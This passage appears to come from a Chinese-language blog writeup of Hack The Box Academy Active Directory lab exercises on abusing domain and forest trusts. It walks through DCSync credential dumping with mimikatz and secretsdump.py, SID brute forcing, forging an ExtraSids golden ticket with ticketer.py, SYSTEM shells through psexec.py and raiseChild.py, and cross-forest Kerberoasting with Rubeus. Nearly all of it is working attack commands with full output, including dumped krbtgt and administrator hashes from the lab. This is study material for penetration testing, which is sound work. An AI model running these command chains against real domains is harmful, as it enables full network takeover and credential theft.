aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/<span class="number">2</span>eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/</span><br><span class="line">      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3</span><br><span class="line">      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH</span><br><span class="line">      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+<span class="number">2</span>+xps6WS/NNf1vZtUV/KRLlW</span><br><span class="line">      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ</span><br><span class="line">      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij</span><br><span class="line">      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T</span><br><span class="line">      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo</span><br><span class="line">      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy</span><br><span class="line">      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP</span><br><span class="line">      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure><p>可以使用<code>klist</code>检查票证是否在内存中。</p><h3 id="DCSync-2"><a href="#DCSync-2" class="headerlink" title="DCSync"></a>DCSync</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\lab_adm&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : lab_adm</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : lab_adm</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">53</span>:<span class="number">21</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1001</span></span><br><span class="line">Object Relative ID   : <span class="number">1001</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">1</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">6053227</span>db44e996fe16b107d9d1e95a0</span><br></pre></td></tr></table></figure><p>当处理多个域并且目标域与用户的域不同时，需要指定确切的域以在特定域控制器上执行 DCSync 操作。此命令如下所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</span></span><br></pre></td></tr></table></figure><h2 id="ExtraSids-Attack-Linux"><a href="#ExtraSids-Attack-Linux" class="headerlink" title="ExtraSids Attack - Linux"></a>ExtraSids Attack - Linux</h2><h3 id="Collect-1"><a href="#Collect-1" class="headerlink" title="Collect"></a>Collect</h3><h4 id="Impacket-secretsdump-py-1"><a href="#Impacket-secretsdump-py-1" class="headerlink" title="Impacket secretsdump.py"></a>Impacket secretsdump.py</h4><p>Impacket secretsdump.py 执行 DCSync</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e</span><br><span class="line">krbtgt:des-cbc-md5:fee04c3d026d7538</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><h4 id="Impacket-lookupsid-py"><a href="#Impacket-lookupsid-py" class="headerlink" title="Impacket lookupsid.py"></a>Impacket lookupsid.py</h4><p>Impacket lookupsid.py  执行 SID 暴力破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Brute forcing SIDs at 172.16.5.240</span><br><span class="line">[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689</span><br><span class="line">500: LOGISTICS\Administrator (SidTypeUser)</span><br><span class="line">501: LOGISTICS\Guest (SidTypeUser)</span><br><span class="line">502: LOGISTICS\krbtgt (SidTypeUser)</span><br><span class="line">512: LOGISTICS\Domain Admins (SidTypeGroup)</span><br><span class="line">513: LOGISTICS\Domain Users (SidTypeGroup)</span><br><span class="line">514: LOGISTICS\Domain Guests (SidTypeGroup)</span><br><span class="line">515: LOGISTICS\Domain Computers (SidTypeGroup)</span><br><span class="line">516: LOGISTICS\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: LOGISTICS\Cert Publishers (SidTypeAlias)</span><br><span class="line">520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: LOGISTICS\Protected Users (SidTypeGroup)</span><br><span class="line">526: LOGISTICS\Key Admins (SidTypeGroup)</span><br><span class="line">553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1001: LOGISTICS\lab_adm (SidTypeUser)</span><br><span class="line">1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)</span><br><span class="line">1103: LOGISTICS\DnsAdmins (SidTypeAlias)</span><br><span class="line">1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)</span><br><span class="line">1106: LOGISTICS\-student_adm (SidTypeUser)</span><br></pre></td></tr></table></figure><p>Impacket lookupsid.py 获取域 SID 和企业管理员的 RID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114</span><br><span class="line">498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: INLANEFREIGHT\administrator (SidTypeUser)</span><br><span class="line">501: INLANEFREIGHT\guest (SidTypeUser)</span><br><span class="line">502: INLANEFREIGHT\krbtgt (SidTypeUser)</span><br><span class="line">512: INLANEFREIGHT\Domain Admins (SidTypeGroup)</span><br><span class="line">513: INLANEFREIGHT\Domain Users (SidTypeGroup)</span><br><span class="line">514: INLANEFREIGHT\Domain Guests (SidTypeGroup)</span><br><span class="line">515: INLANEFREIGHT\Domain Computers (SidTypeGroup)</span><br><span class="line">516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: INLANEFREIGHT\Schema Admins (SidTypeGroup)</span><br><span class="line">519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)</span><br></pre></td></tr></table></figure><h3 id="Golden-Ticket-1"><a href="#Golden-Ticket-1" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>至此，收集到了以下数据点：</p><ul><li>子域的 KRBTGT 哈希：<code>9d765b482771505cbe97411065964d5f</code></li><li>子域的 SID：<code>S-1-5-21-2806153819-209893948-922872689</code></li><li>子域中的目标用户的名称（不需要存在！）：<code>hacker</code></li><li>子域的 FQDN：<code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li><li>根域的企业管理员组的 SID:<code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li></ul><h4 id="Impacket-ticketer-py"><a href="#Impacket-ticketer-py" class="headerlink" title="Impacket ticketer.py"></a>Impacket ticketer.py</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker</span><br><span class="line">[*] PAC_LOGON_INFO</span><br><span class="line">[*] PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*] EncTicketPart</span><br><span class="line">[*] EncAsRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*] PAC_SERVER_CHECKSUM</span><br><span class="line">[*] PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*] EncTicketPart</span><br><span class="line">[*] EncASRepPart</span><br><span class="line">[*] Saving ticket in hacker.ccache</span><br></pre></td></tr></table></figure><p><a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">该票证将作为凭证缓存 (ccache)</a>文件保存到系统中，该文件用于保存 Kerberos 凭证。设置<code>KRB5CCNAME</code>环境变量，使用此文件进行 Kerberos 身份验证尝试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export KRB5CCNAME=hacker.ccache </span><br></pre></td></tr></table></figure><h4 id="Impacket-psexec-py"><a href="#Impacket-psexec-py" class="headerlink" title="Impacket psexec.py"></a>Impacket psexec.py</h4><p>Impacket psexec.py 获取 SYSTEM shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.16.5.5.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file nkYjGWDZ.exe</span><br><span class="line">[*] Opening SVCManager on 172.16.5.5.....</span><br><span class="line">[*] Creating service eTCU on 172.16.5.5.....</span><br><span class="line">[*] Starting service eTCU.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; hostname</span><br><span class="line">ACADEMY-EA-DC01</span><br></pre></td></tr></table></figure><h4 id="Impacket-raiseChild-py"><a href="#Impacket-raiseChild-py" class="headerlink" title="Impacket raiseChild.py"></a>Impacket raiseChild.py</h4><p>Impacket 还具有<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py">raiseChild.py</a>工具，它可以自动从子域升级到父域。</p><p><code>-c</code> 或 <code>-target-exec</code> 获取目标机器上获得一个交互式会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Forest FQDN is: INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL</span><br><span class="line">[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519</span><br><span class="line">[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br><span class="line">LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8</span><br><span class="line">[*] Getting credentials for INLANEFREIGHT.LOCAL</span><br><span class="line">INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d</span><br><span class="line">[*] Target User account name is administrator</span><br><span class="line">INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file BnEGssCE.exe</span><br><span class="line">[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....</span><br><span class="line">[*] Starting service UVNb.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>工作流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 输入：</span><br><span class="line"># 1) 子域管理员凭据（密码、哈希或 aesKey），格式为“域/用户名[:密码]”，指定的域必须是域 FQDN。</span><br><span class="line"># 2) 可选路径名，用于保存生成的黄金票证（-w 开关）</span><br><span class="line"># 3) 可选目标用户 RID，用于获取凭据（-targetRID 开关），默认为管理员。</span><br><span class="line"># 4) 可选 PSEXEC 目标，具有目标用户权限（-target-exec 开关）。默认为企业管理员。</span><br><span class="line">#</span><br><span class="line"># 流程：</span><br><span class="line"># 1) 找出子域控制器的位置并获取其信息（通过 [MS-NRPC]）</span><br><span class="line"># 2) 找出林的 FQDN（通过 [MS-NRPC]）</span><br><span class="line"># 3) 获取林的企业管理员 SID（通过 [MS-LSAT]）</span><br><span class="line"># 4) 获取子域的 krbtgt 凭据（通过 [MS-DRSR]）</span><br><span class="line"># 5) 在 KERB_VALIDATION_INFO 的 ExtraSids 数组中创建一个黄金票证，指定 3) 中的 SID，并将有效期设置为 10 年后</span><br><span class="line"># 6) 使用生成的票证登录林并获取目标用户信息（默认为 krbtgt/admin）</span><br><span class="line"># 7) 如果指定了文件，则以 ccache 格式保存黄金票证</span><br><span class="line"># 8) 如果指定了目标，则启动 PSEXEC shell</span><br><span class="line">#</span><br><span class="line"># 输出：</span><br><span class="line"># 1) 目标用户凭据（林的 krbtgt/admin 凭据）默认情况下)</span><br><span class="line"># 2) 在 ccache 中保存的黄金票，用于将来的乐趣和收益</span><br><span class="line"># 3) 在 target-exec 参数处使用目标用户权限 (默认情况下为企业管理员权限) 的 PSExec Shell。</span><br></pre></td></tr></table></figure><hr><h1 id="Attacking-Domain-Trusts-Cross-Forest-Trust-Abuse"><a href="#Attacking-Domain-Trusts-Cross-Forest-Trust-Abuse" class="headerlink" title="Attacking Domain Trusts - Cross-Forest Trust Abuse"></a>Attacking Domain Trusts - Cross-Forest Trust Abuse</h1><h2 id="Cross-Forest-Kerberoasting-Windows"><a href="#Cross-Forest-Kerberoasting-Windows" class="headerlink" title="Cross-Forest Kerberoasting - Windows"></a>Cross-Forest Kerberoasting - Windows</h2><p>Kerberos 攻击（例如 Kerberoasting 和 ASREPRoasting）可以跨信任执行，具体取决于信任方向。如果您位于具有入站或双向域&#x2F;林信任的域中，则可能会执行各种攻击以获得立足点。</p><h3 id="Enumerating-Accounts-for-Associated-SPNs-PowerView"><a href="#Enumerating-Accounts-for-Associated-SPNs-PowerView" class="headerlink" title="Enumerating Accounts for Associated SPNs -PowerView"></a>Enumerating Accounts for Associated SPNs -PowerView</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br></pre></td></tr></table></figure><p>检查此帐户是否是目标域中域管理员组的成员</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Domain</span> FREIGHTLOGISTICS.LOCAL <span class="literal">-Identity</span> mssqlsvc |<span class="built_in">select</span> samaccountname,memberof</span><br><span class="line"></span><br><span class="line">samaccountname memberof</span><br><span class="line"><span class="literal">--------------</span> <span class="literal">--------</span></span><br><span class="line">mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br></pre></td></tr></table></figure><p>显示此帐户是目标域中域管理员组的成员，因此如果可以对其进行 Kerberoast 攻击并离线破解哈希，拥有目标域的完全管理员权限。</p><h3 id="Kerberoasting-Rubeus"><a href="#Kerberoasting-Rubeus" class="headerlink" title="Kerberoasting - Rubeus"></a>Kerberoasting - Rubeus</h3><p>使用<code>Rubeus</code>执行跨信任的 Kerberoasting 攻击，需要加上<code>/domain:</code>标志指定目标域。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : mssqlsvc</span><br><span class="line">[*] Target Domain          : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : mssqlsvc</span><br><span class="line">[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:<span class="number">1433</span></span><br><span class="line">[*] PwdLastSet             : <span class="number">3</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">47</span>:<span class="number">52</span> PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*mssqlsvc<span class="variable">$FREIGHTLOGISTICS</span>.LOCAL<span class="variable">$MSSQLsvc</span>/sql01.freightlogstics:<span class="number">1433</span>@FREIGHTLOGISTICS.LOCAL*<span class="variable">$</span>&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="Cross-Forest-Kerberoasting-Linux"><a href="#Cross-Forest-Kerberoasting-Linux" class="headerlink" title="Cross-Forest Kerberoasting - Linux"></a>Cross-Forest 